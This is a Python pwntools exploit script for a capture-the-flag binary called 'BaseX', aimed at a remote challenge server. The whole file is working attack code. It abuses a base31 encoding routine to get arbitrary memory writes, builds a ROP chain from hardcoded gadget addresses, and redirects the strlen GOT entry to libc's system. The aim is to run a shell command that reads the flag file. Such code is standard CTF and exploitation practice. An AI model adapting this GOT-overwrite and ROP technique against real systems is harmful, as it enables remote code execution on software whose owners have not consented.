from pwn import *
import time
import sys

debug = False

def pad(s, n=20):
    return "0"*(n-len(s))+s

def pad_null(s, n=20):
    return s+"\x00"*(n-len(s))

def base31(i):
    if i<31:
        return chr(i+48)
    return base31(i//31)+chr((i%31)+48)

def write(r, addr, content, garb_addr):
    r.send(pad(base31(content)))
    r.send(pad(str(addr*(2**32))))
    r.send(pad(base31(0)))
    r.send(pad(str(garb_addr*(2**32))))

def write_payload(r, return_addr, payload, index_garbage=-10):
    for i in range(0, len(payload), 8):
        write(r, return_addr+i//8, u64(payload[i:i+8]), return_addr+index_garbage)

def craft_payload(begin_addr, s):
    payload = ""
    for i in range(0, len(s), 4):
        payload += p64(pop_rbx_rbp_ret)+pad_null(s[i:i+8], 8)+p64(begin_addr+0x3d+i)+p64(mov_ebx_ret)
    return payload


main = 0x400762
pop_rbx_rbp_ret = 0x40075f
pop_rdi_ret = 0x4008f3
mov_ebx_ret = 0x4005f8
target = 0x601020
command_addr = 0x601040 + 8

if len(sys.argv) == 2:
    r = process(["./BaseX"])
    libc = ELF('/usr/lib/libc.so.6')
    gdb.attach(r)
elif len(sys.argv) == 3:
    r = process("/usr/bin/strace -f ./BaseX".split(" "), stderr=2)
    libc = ELF('/usr/lib/libc.so.6')
else:
    r = remote('basex.challs.malice.fr', 4444)
    libc = ELF('./libc.so.6')

command = "cat /srv/flag.txt"

base = ELF("BaseX")
libc_strlen = libc.symbols["__strlen_avx2"]
libc_system = libc.symbols["system"]
stack_chk = base.symbols["plt.__stack_chk_fail"]

print("system: "+hex(libc_system))
print("strlen: "+hex(libc_strlen))

p = make_packer(64, endian='little', sign='signed')
diff = u64(p(libc_system - libc_strlen))
diff = diff & 0xFFFFFFFF

print "diff: %x" % diff

payload = craft_payload(command_addr, command)
payload += craft_payload(target, p32(diff))
payload += p64(pop_rbx_rbp_ret)+p64(0)+p64(0x00400890)
payload += p64(pop_rdi_ret)+p64(command_addr)
payload += p64(base.symbols["strlen"])

write_payload(r, (0x1020/8+1), payload)

time.sleep(2)
r.shutdown('write')
print(r.recvall(timeout=2))
r.interactive()
